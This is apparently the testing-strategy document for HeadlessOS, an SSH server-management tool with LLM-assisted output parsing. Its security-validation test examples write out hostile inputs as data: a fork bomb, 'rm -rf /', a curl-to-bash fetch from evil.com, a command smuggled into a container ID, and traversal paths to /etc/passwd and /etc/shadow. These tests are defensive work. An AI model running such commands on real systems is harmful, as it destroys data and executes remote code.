# Testing Strategy

> Test plan, test types, coverage targets, and how to write tests for HeadlessOS.

## Testing Principles

1. **Test the parsing pipeline heavily** — this is where bugs cause data corruption
2. **Test SSH integration with real connections** — mock-only tests miss real SSH edge cases
3. **Test security validations exhaustively** — every bypass is a potential compromise
4. **Don't test LLM output deterministically** — test the pipeline around it (input prep, validation, caching)

## Test Framework

| Layer | Framework | Runner |
|-------|-----------|--------|
| Backend unit tests | Vitest | `npm test --workspace=server` |
| Backend integration tests | Vitest + real SSH | `npm run test:integration --workspace=server` |
| Frontend component tests | Vitest + React Testing Library | `npm test --workspace=client` |
| E2E tests | Playwright (future) | `npm run test:e2e` |

## Test Structure

```
server/
├── src/
│   └── ...
└── tests/
    ├── unit/
    │   ├── parsers/
    │   │   ├── pipeline.test.ts
    │   │   ├── ansi-strip.test.ts
    │   │   └── deterministic/
    │   │       ├── df.test.ts
    │   │       ├── free.test.ts
    │   │       ├── ps.test.ts
    │   │       ├── ls.test.ts
    │   │       └── ip.test.ts
    │   ├── ssh/
    │   │   └── connection-manager.test.ts
    │   ├── llm/
    │   │   └── provider.test.ts
    │   ├── security/
    │   │   ├── path-validation.test.ts
    │   │   ├── command-validation.test.ts
    │   │   └── input-sanitization.test.ts
    │   └── config/
    │       └── store.test.ts
    ├── integration/
    │   ├── ssh-connection.test.ts      # requires real SSH server
    │   ├── llm-parsing.test.ts         # requires LLM API key
    │   └── full-pipeline.test.ts       # SSH + LLM + parse
    ├── fixtures/
    │   ├── terminal-outputs/
    │   │   ├── df-h.txt                # real `df -h` output samples
    │   │   ├── df-h-edge-cases.txt     # long mount points, 100% usage, etc.
    │   │   ├── free-m.txt
    │   │   ├── ps-aux.txt
    │   │   ├── ls-la.txt
    │   │   ├── ls-la-symlinks.txt
    │   │   ├── ip-brief-addr.txt
    │   │   ├── docker-ps-json.txt
    │   │   ├── systemctl-units.txt
    │   │   └── README.md               # how to add new fixtures
    │   └── expected-outputs/
    │       ├── df-h.json               # expected parsed JSON for each fixture
    │       ├── free-m.json
    │       └── ...
    └── helpers/
        ├── mock-ssh.ts                 # mock SSH connection for unit tests
        └── mock-llm.ts                 # mock LLM provider (returns canned responses)

client/
└── tests/
    ├── components/
    │   ├── FileExplorer.test.tsx
    │   ├── Dashboard.test.tsx
    │   ├── Docker.test.tsx
    │   └── Terminal.test.tsx
    └── hooks/
        └── useServerState.test.ts
```

## Test Categories

### 1. Deterministic Parser Tests (HIGHEST PRIORITY)

These are the most important tests. Each parser must produce correct output for every fixture.

```typescript
// Example: server/tests/unit/parsers/deterministic/df.test.ts
import { describe, it, expect } from 'vitest';
import { dfParser } from '../../../../src/parsers/deterministic/df';
import { DiskUsageArraySchema } from '../../../../src/parsers/schemas/system';
import dfOutput from '../../../fixtures/terminal-outputs/df-h.txt?raw';
import dfExpected from '../../../fixtures/expected-outputs/df-h.json';

describe('df parser', () => {
  it('parses standard df -h output', () => {
    const result = dfParser.parse(dfOutput);
    const validated = DiskUsageArraySchema.parse(result);
    expect(validated).toEqual(dfExpected);
  });

  it('handles 100% disk usage', () => {
    const output = `Filesystem      Size  Used Avail Use% Mounted on
/dev/sda1        50G   50G     0 100% /`;
    const result = dfParser.parse(output);
    expect(result[0].usePercent).toBe(100);
    expect(result[0].available).toBe('0');
  });

  it('handles long mount point names', () => {
    const output = `Filesystem      Size  Used Avail Use% Mounted on
/dev/mapper/vg-lv  100G   60G   40G  60% /var/lib/very/long/path`;
    const result = dfParser.parse(output);
    expect(result[0].mountPoint).toBe('/var/lib/very/long/path');
  });

  it('ignores tmpfs and devtmpfs', () => {
    // Test that tmpfs entries are either included or filtered
    // depending on configuration
  });

  it('returns empty array for empty/error output', () => {
    expect(dfParser.parse('')).toEqual([]);
    expect(dfParser.parse('bash: df: command not found')).toEqual([]);
  });
});
```

### 2. Security Validation Tests (HIGH PRIORITY)

```typescript
// Example: server/tests/unit/security/path-validation.test.ts
describe('path validation', () => {
  it('rejects relative paths', () => {
    expect(() => validatePath('etc/passwd')).toThrow('must be absolute');
  });

  it('rejects path traversal: ../', () => {
    expect(() => validatePath('/var/log/../../etc/passwd')).toThrow('traversal');
  });

  it('rejects path traversal after normalization', () => {
    expect(() => validatePath('/var/log/../../../etc/shadow')).toThrow('traversal');
  });

  it('rejects null bytes', () => {
    expect(() => validatePath('/var/log/\0.txt')).toThrow('Null byte');
  });

  it('accepts valid absolute paths', () => {
    expect(validatePath('/var/log/syslog')).toBe('/var/log/syslog');
    expect(validatePath('/home/user/file.txt')).toBe('/home/user/file.txt');
    expect(validatePath('/')).toBe('/');
  });

  it('normalizes double slashes', () => {
    expect(validatePath('/var//log///syslog')).toBe('/var/log/syslog');
  });

  it('normalizes single dot components', () => {
    expect(validatePath('/var/./log/./syslog')).toBe('/var/log/syslog');
  });
});

// Example: server/tests/unit/security/command-validation.test.ts
describe('command validation', () => {
  it('blocks fork bombs', () => {
    expect(isCommandBlocked(':(){ :|:& };:')).toBe(true);
  });

  it('blocks rm -rf /', () => {
    expect(isCommandBlocked('rm -rf /')).toBe(true);
    expect(isCommandBlocked('rm -rf /var/log')).toBe(false); // specific path OK
  });

  it('blocks curl | bash', () => {
    expect(isCommandBlocked('curl http://evil.com/script.sh | bash')).toBe(true);
  });

  it('allows safe commands', () => {
    expect(isCommandBlocked('df -h')).toBe(false);
    expect(isCommandBlocked('ps aux')).toBe(false);
    expect(isCommandBlocked('docker ps')).toBe(false);
  });

  it('validates container IDs', () => {
    expect(validateContainerId('abc123def456')).toBe('abc123def456');
    expect(() => validateContainerId('abc; rm -rf /')).toThrow();
    expect(() => validateContainerId('')).toThrow();
  });

  it('validates PIDs', () => {
    expect(validatePid('1234')).toBe(1234);
    expect(() => validatePid('-1')).toThrow();
    expect(() => validatePid('99999')).toThrow();
    expect(() => validatePid('abc')).toThrow();
  });
});
```

### 3. Parsing Pipeline Tests

```typescript
describe('ParsingPipeline', () => {
  it('uses deterministic parser when available', async () => {
    const pipeline = new ParsingPipeline(mockLLM);
    pipeline.registerParser('df', dfParser);

    const result = await pipeline.parse('df -h', dfFixture, DiskUsageArraySchema);
    expect(result.parsedBy).toBe('deterministic');
    expect(mockLLM.parseText).not.toHaveBeenCalled();
  });

  it('falls back to LLM when no deterministic parser exists', async () => {
    const pipeline = new ParsingPipeline(mockLLM);

    const result = await pipeline.parse('unknown-cmd', 'some output', SomeSchema);
    expect(result.parsedBy).toBe('llm');
    expect(mockLLM.parseText).toHaveBeenCalledOnce();
  });

  it('falls back to LLM when deterministic parser throws', async () => {
    const pipeline = new ParsingPipeline(mockLLM);
    pipeline.registerParser('df', { parse: () => { throw new Error('parse fail'); } });

    const result = await pipeline.parse('df -h', dfFixture, DiskUsageArraySchema);
    expect(result.parsedBy).toBe('llm');
  });

  it('returns cached result when output unchanged', async () => {
    const pipeline = new ParsingPipeline(mockLLM);

    // First call — goes to LLM
    await pipeline.parse('uptime', 'up 5 days', UptimeSchema);
    expect(mockLLM.parseText).toHaveBeenCalledOnce();

    // Second call — same output — should use cache
    const result = await pipeline.parse('uptime', 'up 5 days', UptimeSchema);
    expect(mockLLM.parseText).toHaveBeenCalledOnce(); // not called again
    expect(result.cached).toBe(true);
  });

  it('strips ANSI codes before parsing', async () => {
    const pipeline = new ParsingPipeline(mockLLM);
    const ansiOutput = '\x1b[32mhello\x1b[0m';

    await pipeline.parse('echo', ansiOutput, StringSchema);

    // LLM should receive clean text
    expect(mockLLM.parseText).toHaveBeenCalledWith(
      expect.objectContaining({ rawOutput: 'hello' })
    );
  });
});
```

### 4. LLM Provider Tests

Don't test LLM accuracy deterministically — it's non-deterministic. Test the wrapper:

```typescript
describe('OpenAIProvider', () => {
  it('sends correct system prompt', async () => {
    // Mock OpenAI client, verify system prompt is included
  });

  it('converts Zod schema to JSON Schema correctly', async () => {
    // Verify zodResponseFormat produces valid schema
  });

  it('validates response against Zod schema', async () => {
    // Verify that invalid LLM responses are caught
  });

  it('tracks token usage', async () => {
    const result = await provider.parseText({ ... });
    expect(result.tokensUsed.input).toBeGreaterThan(0);
    expect(result.tokensUsed.output).toBeGreaterThan(0);
  });

  it('handles API timeout gracefully', async () => {
    // Mock timeout, verify error is thrown with meaningful message
  });

  it('handles rate limiting with retry', async () => {
    // Mock 429 response, verify retry logic
  });
});
```

### 5. SSH Connection Manager Tests

**Unit tests** (mocked SSH):
```typescript
describe('ConnectionManager (unit)', () => {
  it('emits stateChange on connect', async () => { ... });
  it('emits stateChange on disconnect', async () => { ... });
  it('manages multiple connections independently', async () => { ... });
  it('rejects exec when not connected', async () => { ... });
  it('enforces command timeout', async () => { ... });
});
```

**Integration tests** (real SSH — requires SSH server):
```typescript
describe('ConnectionManager (integration)', () => {
  // These tests require SSH_TEST_HOST, SSH_TEST_USER, SSH_TEST_KEY env vars
  // Skipped in CI unless credentials are provided

  it('connects to real server via key auth', async () => { ... });
  it('executes command and returns output', async () => { ... });
  it('handles concurrent exec calls', async () => { ... });
  it('detects installed tools', async () => { ... });
  it('SFTP reads file content', async () => { ... });
});
```

### 6. Frontend Component Tests

```typescript
// Example: client/tests/components/Dashboard.test.tsx
describe('DashboardView', () => {
  it('renders disk usage cards', () => {
    render(<DashboardView data={mockDashboardData} />);
    expect(screen.getByText('/dev/sda1')).toBeInTheDocument();
    expect(screen.getByText('48%')).toBeInTheDocument();
  });

  it('shows loading state while fetching', () => {
    render(<DashboardView data={null} loading={true} />);
    expect(screen.getByRole('progressbar')).toBeInTheDocument();
  });

  it('shows error state on failure', () => {
    render(<DashboardView data={null} error="Connection lost" />);
    expect(screen.getByText('Connection lost')).toBeInTheDocument();
    expect(screen.getByRole('button', { name: /retry/i })).toBeInTheDocument();
  });
});
```

## Test Fixtures

Store real terminal output samples in `server/tests/fixtures/terminal-outputs/`:

**How to collect fixtures:**
```bash
# Run on your VPS and save output:
ssh user@server 'df -h' > tests/fixtures/terminal-outputs/df-h.txt
ssh user@server 'free -m' > tests/fixtures/terminal-outputs/free-m.txt
ssh user@server 'ps aux --sort=-%mem | head -50' > tests/fixtures/terminal-outputs/ps-aux.txt
ssh user@server 'ls -la --time-style=long-iso /' > tests/fixtures/terminal-outputs/ls-la.txt
```

Collect from multiple distros (Ubuntu, Debian, CentOS, Alpine) since output format can vary.

## Coverage Targets

| Area | Target | Rationale |
|------|--------|-----------|
| Deterministic parsers | 100% | These replace LLM — must be perfect |
| Security validators | 100% | Every bypass is a vulnerability |
| Parsing pipeline | 90% | Core data flow |
| SSH connection management | 80% | Complex async, some edge cases hard to mock |
| LLM provider wrappers | 70% | Can't test LLM accuracy, test the wrapper |
| API routes | 80% | Request/response validation |
| React components | 60% | Visual components — hard to test perfectly |

## Running Tests

```bash
# All tests
npm test

# Server tests only
npm test --workspace=server

# Client tests only
npm test --workspace=client

# Watch mode (during development)
npm run test:watch --workspace=server

# Integration tests (requires SSH credentials)
SSH_TEST_HOST=your.server.ip SSH_TEST_USER=root SSH_TEST_KEY=~/.ssh/id_rsa \
  npm run test:integration --workspace=server

# Coverage report
npm run test:coverage --workspace=server
```

## CI Pipeline (Future)

```yaml
# .github/workflows/test.yml
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with: { node-version: 20 }
      - run: npm install
      - run: npm test            # unit tests only (no SSH, no LLM API)
      - run: npm run test:coverage
      - uses: codecov/codecov-action@v4
```
